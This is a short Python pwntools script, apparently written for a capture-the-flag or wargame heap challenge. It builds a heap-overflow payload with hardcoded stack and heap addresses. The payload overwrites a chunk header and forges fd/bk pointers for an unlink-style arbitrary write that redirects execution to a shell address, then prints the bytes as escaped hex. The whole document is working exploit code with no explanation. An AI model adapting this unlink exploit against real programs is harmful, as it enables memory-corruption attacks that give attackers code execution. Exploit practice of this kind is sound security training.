from pwn import *

stack = 0xffb8f214
heap = 0x96e9410

payload = p32(0x80484eb)        # shell addr on heap at A->buf[0-3]
payload += p32(heap + 0xc)      # heap addr to self addr at heap at A->buf[4-7]
payload += b'C' * 4             # B chunck header overwrite
payload += b'D' * 4             # B chunck header overwrite
payload += p32(stack - 0x20)    # B->fd = stack - 0x20
payload += p32(heap+0xc)        # B->bk = heap + 0xc

# print(payload)
hex_str = payload.hex()
fs = ''.join([f'\\\\x{hex_str[i:i+2]}' for i in range(0, len(hex_str), 2)])
print(fs)